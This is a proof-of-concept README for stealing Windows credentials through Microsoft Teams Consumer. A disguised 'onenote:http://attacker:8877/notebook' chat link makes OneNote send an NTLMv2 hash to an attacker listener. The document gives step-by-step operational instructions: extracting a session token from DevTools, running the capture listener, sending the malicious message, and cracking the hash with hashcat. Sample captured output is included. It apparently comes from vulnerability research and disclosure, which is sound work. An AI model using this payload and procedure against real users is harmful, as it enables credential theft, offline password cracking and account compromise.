# Teams `onenote://` → NTLMv2 Hash Capture

## For Educational and Authorized Testing Only  
Do not use this against systems you do not own or have explicit permission to test.

## Overview

Microsoft Teams Consumer (`teams.live.com`) allows `onenote://` URIs inside chat message HTML.

When a victim clicks such a link:

1. Microsoft OneNote launches automatically.
2. No operating system confirmation dialog is shown.
3. OneNote immediately connects to the attacker-controlled server specified in the URI.
4. If that server issues an `WWW-Authenticate: NTLM` challenge, OneNote performs an NTLM authentication handshake.
5. The attacker captures the victim's **NTLMv2 hash**, which can later be cracked offline to recover the Windows password.

> **Note**
>
> On tested standalone machines, Windows displays a credential prompt.
> In some enterprise environments with permissive authentication policies
> (for example `AuthServerAllowlist` or Intranet Zone auto-authentication),
> authentication may complete silently without user interaction.

---

# Vulnerability Details

| Field | Value |
|----------|----------|
| **Product** | Microsoft Teams Consumer (`teams.live.com`) |
| **Component** | Chat HTML sanitizer (`sanitize-html`, module 20409) |
| **Issue Type** | Credential theft via unvalidated URI scheme |
| **Impact** | NTLMv2 hash capture → offline password cracking |
| **User Interaction** | Single click |

---

# Root Cause

Teams explicitly allowlists `onenote://` URIs:

```javascript
_allowedHrefProtocols = [
    "http",
    "https",
    "ftp",
    "mailto",
    "vscode://",
    "vsls://",
    "onenote://"
];
```

Because of this allowlist, links like:

```text
onenote:http://attacker:8877/notebook
```

pass through the sanitizer unchanged.

When activated, OneNote interprets the embedded HTTP URL as a WebDAV notebook and immediately connects to the remote server, performing NTLM authentication if challenged.

---

# Why This Matters

- Any Teams participant can send the malicious link.
- The hyperlink appears completely normal.
- OneNote launches automatically.
- NTLM authentication occurs immediately.
- Captured hashes can be cracked offline using tools like Hashcat.

---

# Attack Flow

```text
Attacker
    │
    │ Send Teams message:
    │
    │ <a href="onenote:http://attacker:8877/notebook">
    │     Open shared notebook
    │ </a>
    │
    ▼

Victim clicks link

    ▼

OneNote launches

    ▼

HTTP request to attacker

    ▼

401 WWW-Authenticate: NTLM

    ▼

NTLM Type 1

    ▼

NTLM Type 2 Challenge

    ▼

NTLM Type 3 Authenticate

    ▼

Attacker captures NTLMv2 hash

    ▼

Offline cracking

hashcat -m 5600 captured_hashes.txt wordlist.txt
```

---

# Proof of Concept

## Requirements

| Item | Description |
|----------|-------------|
| Python | 3.6+ |
| Attacker | Teams account |
| Victim | Shared Teams conversation |
| Listener | Reachable on TCP 8877 |

---

## Files

| File | Purpose |
|----------|-------------|
| `listener.py` | NTLM capture server |
| `send_probe.py` | Sends malicious Teams message |
| `captured_hashes.txt` | Stores captured hashes |

---

# Step 1 — Obtain `skypetoken` and `thread_id`

Using browser DevTools:

1. Open Teams.
2. Open the target conversation.
3. Press **F12**.
4. Open **Network**.
5. Filter:

```
msgapi
```

6. Select any request.

## Extract `skypetoken`

```
Authentication:
skypetoken=eyJhbGc...
```

Copy everything after:

```
skypetoken=
```

---

## Extract `thread_id`

From:

```
https://msgapi.teams.live.com/v1/users/ME/conversations/19:uni01_xxxxx@thread.v2/messages
```

copy:

```
19:uni01_xxxxx@thread.v2
```

If `HTTP 401` occurs, obtain a fresh token.

---

# Step 2 — Start Listener

```bash
python listener.py 8877
```

Example:

```
[*] NTLM capture listener started
[*] Listening on      : 0.0.0.0:8877
[*] Server challenge  : 0102030405060708
[*] Waiting for connections...
```

---

# Step 3 — Send Probe

```bash
python send_probe.py \
    "eyJhbGc..." \
    "19:uni01_xxx@thread.v2" \
    attacker-ip \
    8877
```

Payload:

```html
<a href="onenote:http://attacker:8877/notebook">
    Open shared notebook
</a>
```

---

# Step 4 — Victim Click

Victim sees:

```
Open shared notebook
```

After clicking:

- OneNote launches
- HTTP connection established
- NTLM negotiation begins
- Hash captured

---

# Step 5 — Captured Hash

Example output:

```
[!!!] NTLMv2 HASH CAPTURED

User        : jsmith
Domain      : CONTOSO
Workstation : LAPTOP-ABC

jsmith::CONTOSO:0102030405060708:...
```

Automatically appended to:

```
captured_hashes.txt
```

---

# Step 6 — Crack

```bash
hashcat -m 5600 captured_hashes.txt wordlist.txt
```

---

# Lab Results

## Environment

- Windows 10 x64
- OneNote 16.0.19822.20086
- Microsoft Account (non-domain)

---

## Results

| Test | Status |
|------------|------------|
| `onenote:http://` survives sanitizer | ✅ Confirmed |
| OneNote launches automatically | ✅ Confirmed |
| HTTP requests sent | ✅ Confirmed |
| NTLM Type 1/2/3 | ✅ Confirmed |
| NTLMv2 captured | ✅ Confirmed |
| Credential prompt (standalone) | ✅ Present |
| Silent domain authentication | ❌ Not confirmed |
| URL preview auto-fetch | ❌ Negative |
| `onenote:https://` with valid TLS | ✅ Confirmed |

---

# Impact

- NTLMv2 credential exposure
- Offline password cracking
- Possible Pass-the-Hash attacks in enterprise environments
- Single-click exploitation
- No dropped files
- Uses trusted Microsoft software
- Easily scalable across group chats

---

# Affected Versions

| Component | Version |
|------------|------------|
| Teams Consumer | `teams.live.com` (2026-04-15) |
| OneNote | `16.0.19822.20086` |
| `sanitize-html` | `v2.3.2+` |

---


# Disclosure

This proof of concept was developed exclusively in a self-owned laboratory environment during authorized security testing.

No real user credentials were captured.
